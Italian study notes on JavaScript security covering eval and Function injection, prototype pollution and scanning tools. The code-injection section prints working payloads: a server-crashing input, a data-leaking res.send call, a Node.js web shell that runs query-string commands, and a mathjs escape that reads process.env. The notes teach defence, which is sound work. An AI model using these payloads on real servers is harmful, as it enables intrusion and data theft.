# Javascript security

Il web è pericolo, esistono ___Attackers___ capaci e motivati, il codice e le configurazioni spesso presentano ___vulnerabilities___ che portano a ___data breaches___ (furti di dati o abuso di funzionalità) o a rottura del server (denial of service DOS)

## Javascript security model
Ogni applicazione ha generalmente una architettura composta da tre layer, browser, server, database. Javascript può essere utilizzato sui primi due (se viene bucata la parte node si può accedere al data store con un data breach che coinvolge molti utenti). Se viene bucata la parte FE il problema è di solito limitato ad un singolo utente.

### Browser
Il browser scarica il codice, html, css e js per ogni tab, ma il browser esegue ogni sito in un sandbox (processo separato dell'OS) quindi un sito non può accedere ai dati di un altro website. L'uso di siti che scaricano risorse protetti dal protocollo HTTPS e usando Subresource Integrity (SRI) prevengono l'injecting di codice dannoso nei siti da parte di attackers. Il codice Javascript che gira nel browser non può accedere a risorse locali (file, device, reti locali), può utilizzare solo browser API e non può accedere a dati di altri siti 

### Node.js
Node.js a differenza del browser può accedere a risorse locali, a device ed a reti locali, quindi se viene bucato può portare a grossi problemi. E' essenziale fare un input data validation il più possibile severa e controllare che il formato (tipo) di ogni dato sia corretto. 

## Dynamic type system vulnerabilities
___La natura dinamica di Javascript può portare a bug di sicurezza___. Ad esempio il dinamic type system può essere un problema che porta a rivelazioni non intenzionali di informazioni o altri bug di sicurezza, basta cambiare il tipo di una variabile ed avere controlli che non utilizzano lo strict mode e ci può essere un problema.  

## Code injection attacks
___Javascript può invocare il Javascript engine a runtime___. Se un attacker manda un payload malevolo con all'interno del codice che può essere eseguito mischiato a dati, l'applicazione che gira nel server parsa questi dati e se c'è una vulnerabilità legata ad esecuzione di codice l'applicazione esegue il codice malevolo fornito dall'attacker

Il codice javascript può essere caricato da WEB, files o input di utente e variabili del programma. Funzioni non sicure sono spesso chiamate ___sinks___
```javascript

const expression = "(1+1)*2";   // user input

const result = eval(expression) // parse, compile, execute

console.log(result) // 4,
console.log(typeof result) // number,

// 1) si può usare eval che accede al global e current scope
eval(code)                // invocazione diretta
const evil = eval(code)() // invocazione indiretta

// 2) si può eseguire codice anche tramite la Function constructor, che dà accesso al global scope
f = new Function('param', code)
f('argument') // si invoca la funzione

// 3) esiste una versione "insicura" di setTimeout, setInterval che esegue codice dopo uno specificato delay
```

L'idea è quella di controllare gli input con validazione e sanitization e di non mettere nel codice  `eval()`, `new Function` e guardare che le librerie third party siano sicure (non utilizzino tali funzioni).

```javascript
// se all'interno del query str mettiamo
// e all'interno del codice si fa uso di eval o new Function si crasha il sistema
param=process.exit(99)

// oppure mandando indietro i dati
param=res.send(JSON.stringify(users))
```
Si può mandare del codice che starta un altro server su una porta differente che esegue su quel server comandi linux (come una WEB SHELL) mandati come query string parameters:
```javascript
require('http').createServer(function (req, res) {
    res.writeHead(200, { "Content-Type": "text/plain" });
    require('child_process').exec(require('url').parse(req.url, true).query['cmd'], function (e, s, st) {
        res.end(s);
    });
}).listen(8000) // si cambia porta

// si usa localhost:8000/?cmd=ls per vedere tutti i file sul server

// ESEMPIO:
const math = require('mathjs')
math.eval('3+4*4')      // espressione matematica
math.eval('sqrt(-4'))   // access to function
math.eval('sgrt.constructor("return process.env")()');
```

## Prototype pollution
Tramite l'ereditarietà prototipale, è possibile modificare il comportamento degli oggetti figli. Ogni oggetto ha un parent Object da cui eredita proprietà: se gli attackers modificano gli oggetti che formano la catena dei prototipi possono alterare il comportamento del codice in maniere dannose e far crashare il codice.
```javascript
 
const parent = {a:1}

const child = Object.create(parent)
console.log(child.a)                        // 1
console.log(child.__proto__ === parent)    // true
```

Esempio di prototype pollution:
```javascript

const user = {name:'Lorenzo'}

const malicious = {isAdmin: true}
user['__proto__'] = malicious 
console.log(user.isAdmin);  // true -> Escalation of privilege
``` 

Degli indizi di prototype pollution possono essere:
- mutazioni di proprietà con key/value no sicuri
- merge di oggetti ricorsivi
- copie di oggetti
- accesso di proprietà tramite path

Per evitare il prototype pollution si usa in genere la validazione tramite Json schema, frizzare il prototype tramite `Object.freeze` oppure creare oggetti senza protoype con `Object.create(null,...)` oppure usare Map al posto di `{}`.

## Javascript security testing tools
Tramite degli strumenti automatizzati di Static analysis si previene l'uso di funzioni non sicure, scoprire  prototype pollution e scoprire librerie esterne vulnerabili. Si usano:
- SAST: static application (sul codice) security testing
    - ESlint
    - semgrep (open source)
- DAST: Dynamic application (runnig application) security testing
    - Owasp ZAP
- IAST: Interactive application security testing

ESLint ((--saveDev) permette di eseguire una code analysis che trova bugs e errori nel codice tramite il parsing dinamico del codice ed è basata su coding style ed è integrato in IDE.

Usando Unit test si previene il prototype pollution.

Tra gli strumenti di dependency management si ricorda: 
- `npm audit` che scannerizza le dipendenze per vulnerabilità
- Retire.js ()
- Dependency-Track (open source)
- Snyk (open source)

``` bash
& npm list  # si vede le librerie
& npm audit # trova le vulnerabilità
& npm i lodash@latest # si aggiornano le dipendenze vulnerabili all'ultima version
``` 

# Links:

[corso](https://app.pluralsight.com/library/courses/javascript-security-best-practices/table-of-contents)